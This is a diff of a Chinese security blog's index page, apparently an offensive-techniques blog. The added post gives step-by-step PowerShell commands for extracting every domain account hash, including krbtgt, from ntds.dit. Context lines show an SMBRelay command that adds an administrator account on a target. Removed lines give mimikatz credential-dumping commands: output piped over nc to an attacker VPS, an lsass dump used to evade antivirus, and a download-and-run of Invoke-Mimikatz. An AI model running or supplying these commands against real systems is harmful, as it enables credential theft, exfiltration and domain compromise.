@@ -139,6 +139,50 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/08/15/powershell-domainhash/">
+                完整导出域内用户hash小记 [利用powershell离线提取域内所有账户hash]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h4 id="DSInternals-PowerShell"><a href="#DSInternals-PowerShell" class="headerlink" title="DSInternals PowerShell"></a>DSInternals PowerShell</h4><p>本地测试环境:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">win <span class="number">2012</span>r2</div></pre></td></tr></table></figure></p>
+<p>离线导出环境要求:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Windows PowerShell <span class="number">3</span>+</div><div class="line">.NET Framework <span class="number">4.5</span>+</div></pre></td></tr></table></figure></p>
+<p>支持的系统:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Windows Server <span class="number">2012</span> R2</div><div class="line">Windows Server <span class="number">2008</span> R2</div><div class="line">Windows <span class="number">10</span> <span class="number">64</span>-bit</div><div class="line">Windows <span class="number">8.1</span> <span class="number">64</span>-bit</div><div class="line">Windows <span class="number">7</span> <span class="number">64</span>-bit</div></pre></td></tr></table></figure></p>
+<p>先看下当前系统的powershell版本:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps &gt; Get-Host <span class="params">| Select-Object Version</span></div></pre></td></tr></table></figure></p>
+<p>放开pwoershell脚本执行限制:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash version.png" alt=""><br></p>
+<p>准备好ntds.dit和SYSTEM.hiv文件:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ntds.dit [可以利用shadowcopy.bat快速获取]</div><div class="line">system.hiv [reg即可获取]</div><div class="line">reg save hklm\system system.hive</div></pre></td></tr></table></figure></p>
+<p>安装,导入DSInternals模块:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd DSInternals</div><div class="line">powershell</div><div class="line">Import-Module .\DSInternals</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash ntds system.png" alt=""><br></p>
+<p>直接导出域内所有用户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></div><div class="line">Get-ADDBAccount -All -DBPath <span class="string">"C:\ntds.dit"</span> -BootKey $key <span class="params">| Out-File hash.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash hashres.png" alt=""><br></p>
+<p>也可只获取指定账户的详细信息<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></div><div class="line">Get-ADDBAccount -DistinguishedName <span class="string">'CN=krbtgt,CN=Users,DC=klionsec,DC=org'</span>  -DBPath <span class="string">'C:\ntds.dit'</span> -BootKey $key</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash krbrgethash.png" alt=""><br><br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/08/14/shadow-copy-hash/">
                 完整导出域内用户hash小记 [vshadow + ShadowCopy + QuarksPwDump]
             </a>
@@ -496,42 +540,6 @@
 <p><img src="/img/RESPONESNDERS_HSAHS_shells.png" alt=""><br><img src="/img/RESPONESNDERS_HSAHS_exec.png" alt=""><br><img src="/img/RESPONESNDERS_HSAHS_send_shell.png" alt=""><br><img src="/img/RESPONESNDERS_HSAHS_backdoor_exec.png" alt=""><br></p>
 <h5 id="利用responder进行smbrelay攻击-后面可以连续提供多个用户名进行尝试-记得用空格分开即可"><a href="#利用responder进行smbrelay攻击-后面可以连续提供多个用户名进行尝试-记得用空格分开即可" class="headerlink" title="利用responder进行smbrelay攻击(后面可以连续提供多个用户名进行尝试,记得用空格分开即可):"></a>利用responder进行smbrelay攻击(后面可以连续提供多个用户名进行尝试,记得用空格分开即可):</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python SMBRelay.py -t 192.168.3.251 -c "net user smbdemo adminUser123 /ADD &amp;&amp; net localgroup administrators smbdemo /add" -t 192.168.3.5 -u Administrator</span></div></pre></td></tr></table></figure>
 <p><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;相对于各类传统的中间人,类似这一类的攻击,成功率相对来说,也许会更高一点,关于responder的用法,这里只简单列举了一部分,观察到最新版的里面又加了很多貌似很好用的功能,后续抽空再继续更新吧,另外,也期待大家能一起积极深入交流讨论<br><br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/07/23/mimikatz-one/">
-                mimikatz 用法小记 [ 非交互抓取本地密码明文及hash ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-07-23</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/get-hash/">get hash</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>1,非交互抓明文,不留任何文件,直接把抓取结果用nc发到指定的远程机器(一般是自己的vps)上,可能有些端口出不来,换几个常用的即可,80,8080,443,53……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit |  nc -vv 192.168.3.251 1234  在目标机器上执行</span></div><div class="line"><span class="comment"># nc -lvp 1234  本地(vps上)机器执行</span></div></pre></td></tr></table></figure></p>
-<p>2,本地非交互抓明文,把抓取的结果重定向到指定的文件中<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full""  exit &gt;&gt; shash.txt</span></div></pre></td></tr></table></figure></p>
-<p>3,有时候由于杀软的问题,直接抓可能需要免杀,这时可以先用procdump把lsass.exe进程中的数据导出到指定文件中(可能有点儿大),再在本地用mimikatz读取该文件中的密码hash,以实现免杀效果,不过这里需要注意的是,本地读文件的系统平台和目标的系统务必完全一致<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span></div><div class="line"><span class="comment"># mimikatz.exe</span></div><div class="line"><span class="comment"># sekurlsa::minidump lsass.dmp</span></div><div class="line"><span class="comment"># sekurlsa::logonPasswords full</span></div></pre></td></tr></table></figure></p>
-<p>4,最后一种本地,非交互抓hash的方式,利用powershell版的Mimikatz,进行抓取,有一定的免杀效果,对360杀毒目前为止是没有任何感觉的,但Nod基本是秒的,这个大家可以根据自己的实际情况而定,选择性使用<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" | nc -vv 192.168.3.28 1234</span></div><div class="line"><span class="comment"># nc -lvp 1234  本地(vps上)机器执行</span></div></pre></td></tr></table></figure></p>
-<p>5,关于mimikatz 在域内网渗透中的更多实战用法,篇幅原因,待续……<br><br></p>
-<h4 id="一点小结"><a href="#一点小结" class="headerlink" title="一点小结:"></a>一点小结:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;关于更多的细节,如果大家有兴趣想深入研究,在作者的博客上已经提供了该工具的源码,请自行阅读,另外,需要提醒一下凡是要涉及到的系统底层的操作,务必最少都要有管理员权限,抓hash自然不例外,不出意外的情况下,我们再成功提权(获取system权限)以后的下一步操作就是抓hash,好啦,废话就不多说了,这些东西想必大家都已经非常熟练了<br><br></p>
 
         </div>
     
